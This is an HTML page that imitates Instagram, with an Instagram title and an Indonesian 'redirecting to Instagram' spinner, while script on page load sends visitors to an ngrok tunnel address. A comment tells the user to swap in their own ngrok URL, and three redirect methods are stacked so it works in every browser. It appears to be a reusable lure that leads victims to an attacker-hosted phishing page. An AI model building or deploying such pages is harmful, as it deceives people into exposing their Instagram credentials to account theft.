<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        .loader {
            text-align: center;
        }
        .loader .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #dbdbdb;
            border-top: 4px solid #0095f6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 16px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loader p { color: #8e8e8e; font-size: 14px; }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Mengalihkan ke Instagram...</p>
    </div>

    <script>
        // Ganti dengan URL ngrok-mu
        var targetUrl = "https://blimp-stew-vocalist.ngrok-free.dev/";

        // Multiple method biar work di semua browser
        window.location.replace(targetUrl);
        
        // Fallback
        setTimeout(function() {
            window.location.href = targetUrl;
        }, 200);
        
        // Last resort
        setTimeout(function() {
            window.open(targetUrl, '_self');
        }, 400);
    </script>
</body>
</html>
